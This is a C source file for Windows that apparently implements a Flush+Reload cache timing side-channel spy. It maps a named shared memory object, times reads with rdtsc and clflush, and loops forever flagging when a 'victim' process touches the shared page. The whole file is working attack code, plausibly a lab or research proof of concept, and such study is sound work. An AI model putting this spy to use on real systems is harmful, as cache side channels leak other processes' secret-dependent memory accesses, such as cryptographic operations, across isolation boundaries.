#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <intrin.h>
#include <immintrin.h>

#ifndef CREATE_WAITABLE_TIMER_HIGH_RESOLUTION
#define CREATE_WAITABLE_TIMER_HIGH_RESOLUTION 0x00000002
#endif


#define BUF_SIZE 2
char szName[] = "MyFileMappingObject";




void sleep_us(LONGLONG microseconds) {
    // Requires Windows 10 v1803+
    HANDLE timer = CreateWaitableTimerExW(
        NULL, 
        NULL, 
        CREATE_WAITABLE_TIMER_HIGH_RESOLUTION, 
        TIMER_ALL_ACCESS
    );
    if (!timer) return;

    // Negative values indicate relative time in 100-nanosecond intervals
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -(microseconds * 10);

    SetWaitableTimer(timer, &dueTime, 0, NULL, NULL, FALSE);
    WaitForSingleObject(timer, INFINITE);
    CloseHandle(timer);
}



int compare(const void *a, const void *b) {
    uint64_t int_a = *(const uint64_t *)a;
    uint64_t int_b = *(const uint64_t *)b;
    return (int_a > int_b) - (int_a < int_b); // Safe comparison to prevent integer overflow
}

uint64_t findMedian(uint64_t arr[], uint64_t n) {
    // 1. Sort the array in ascending order
    qsort(arr, n, sizeof(uint64_t), compare);

    // 2. If the number of elements is even, average the two middle elements
    if (n % 2 == 0) {
        return (arr[(n/2)-1] + arr[n/2])/2;
    } 
    // 3. If odd, return the exact middle element
    else {
        return arr[n / 2];
    }
}



int main()
{

   SetThreadAffinityMask(GetCurrentThread(), 1);

   HANDLE hMapFile;
   char* pBuf;

   hMapFile = OpenFileMapping(
                   FILE_MAP_ALL_ACCESS,   // read/write access
                   FALSE,                 // do not inherit the name
                   szName);               // name of mapping object

   if (hMapFile == NULL){
      printf("Could not open file mapping object (%d).\n", GetLastError());
      return 1;
   }

   pBuf = (char *) MapViewOfFile(hMapFile, // handle to map object
               FILE_MAP_ALL_ACCESS,  // read/write permission
               0,
               0,
               BUF_SIZE);

   if (pBuf == NULL){
      printf("Could not map view of file (%d).\n", GetLastError());
      CloseHandle(hMapFile);
      return 1;
   }

    unsigned char checksum = 0;

    volatile const char* target = (volatile const char*) pBuf;

    printf("\nProfiling...");

    #define PROFILING_SAMPLES 1000
    uint64_t timings[PROFILING_SAMPLES];

    for(int i=0; i<PROFILING_SAMPLES; i++){
        uint64_t start, end;
        unsigned int aux;

        _mm_lfence();
        start = __rdtsc();
        _mm_lfence();
        char a = *target;
        end = __rdtscp(&aux);
        _mm_lfence();

        timings[i] = end - start;
        _mm_clflush(pBuf);
        _mm_mfence();

        checksum ^= a;  // Statement to make sure a is used, so compiler does not optimize it away
        sleep_us(400);
    }

    uint64_t median = findMedian(timings, PROFILING_SAMPLES);

    printf("\nProfiling completed!\n");
    printf("Median : %" PRIu64 "\n\n", median);


    printf("\nStarting spying on victim...");

    #define TESTING_SAMPLES 1000
    uint64_t testing_timings[TESTING_SAMPLES];

    while(1){
        for(int i=0; i<TESTING_SAMPLES; i++){
            //printf("%s\n", pBuf);
            //scanf("%d", &temp);
            
            uint64_t start, end;
            unsigned int aux;

            _mm_lfence();
            start = __rdtsc();
            _mm_lfence();
            char a = *target;
            end = __rdtscp(&aux);
            _mm_lfence();

            //printf("%llu\n", (unsigned long long)(end - start));
            testing_timings[i] = end - start;
            _mm_clflush(pBuf);
            _mm_mfence();

            checksum ^= a;
            //Sleep(1);
            sleep_us(400);
        }

        uint64_t current_median = findMedian(testing_timings, TESTING_SAMPLES);
        if(current_median < median*0.75){
            printf("Victim highly likely accessing memory!!");
        }
        printf("Current Median %" PRIu64 "\n", findMedian(testing_timings, TESTING_SAMPLES));

    }

    // Print after all measurements
    /*FILE *fptr = fopen("alternatetimings.txt", "w");
    for (int i = 0; i < SAMPLES; i++)
    {
        fprintf(fptr, "%llu\n", (unsigned long long)timings[i]);
        //printf("%llu\n", (unsigned long long)timings[i]);
    }
    fclose(fptr);*/

   UnmapViewOfFile(pBuf);
   CloseHandle(hMapFile);

   return 0;
}